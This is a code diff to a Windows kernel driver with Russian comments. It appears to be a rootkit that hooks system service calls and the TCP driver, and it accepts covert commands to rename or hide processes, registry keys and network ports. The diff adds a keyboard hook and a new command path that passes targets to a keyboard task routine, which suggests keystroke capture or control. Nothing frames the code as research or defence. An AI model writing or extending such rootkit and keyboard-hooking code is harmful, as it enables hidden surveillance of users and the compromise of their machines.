@@ -4,6 +4,7 @@
 #include "net.h"
 #include "file.h"
 #include "key.h"
+#include "keyboard.h"
 
 typedef struct _KSERVICE_TABLE_DESCRIPTOR {
     PULONG_PTR Base;        // массив адресов системных вызовов(сервисов)
@@ -125,6 +126,14 @@ NTSTATUS DriverEntry(IN PDRIVER_OBJECT dob, IN PUNICODE_STRING rgp) {
     InitializeListHead(&glTaskQueueNet);
     //
 
+    //Hook keyboard
+    status = InitHookKeyboard(dob);
+    if (!NT_SUCCESS(status)) {
+        DbgPrint("Init hook keyboard error %X", status);
+        return status;
+    }
+    //
+
     dob->DriverUnload = DriverUnload;
     return STATUS_SUCCESS;
 }
@@ -171,6 +180,10 @@ VOID DriverUnload(IN PDRIVER_OBJECT dob) {
     ExDeletePagedLookasideList(&glPagedTaskQueueNet);
     //
 
+    //unhook keyboard
+    UnhookKeyboard(dob);
+    //
+
     if (glRealIrpMjDeviceControl) {
         pTcpDriver->MajorFunction[IRP_MJ_DEVICE_CONTROL] = glRealIrpMjDeviceControl;
     }
@@ -195,6 +208,7 @@ ULONG_PTR HookNtCreateIoCompletion(
         pCmd = (PCOMMAND)arg_02;
         if (pCmd->flags & COMMAND_TEST_COMMAND) {
             DbgPrint("HookNtCreateIoCompletion execute\n");
+            DbgPrint("RtlUpperChar %c", RtlUpperChar('s'));
         }
         else if (pCmd->flags & COMMAND_RENAME_PROCESS) {
             ULONG len = 0;
@@ -219,7 +233,6 @@ ULONG_PTR HookNtCreateIoCompletion(
                 TaskQueueByFilename((PCHAR)pCmd->target);
 
             }
-
         }
         else if (pCmd->flags & COMMAND_RENAME_KEY) {
             if (pCmd->flags & COMMAND_BUFFER_POINTER && pCmd->target != NULL && pCmd->change != NULL) {
@@ -236,6 +249,14 @@ ULONG_PTR HookNtCreateIoCompletion(
             }
             else if (pCmd->flags & COMMAND_BUFFER_DST_PORT) {
                 TaskQueueByNet((ULONG)pCmd->target, FALSE);
+            }
+        }
+        else if (pCmd->flags & COMMAND_KEYBOARD) {
+            if (pCmd->flags & COMMAND_BUFFER_POINTER && pCmd->target != NULL) {
+
+                DbgPrint("Task keyboard %s %d\n", (PCHAR)pCmd->target, (ULONG)pCmd->change);
+                TaskKeyboard((PCHAR)pCmd->target, (ULONG)pCmd->change);
+
             }
         }
         else {
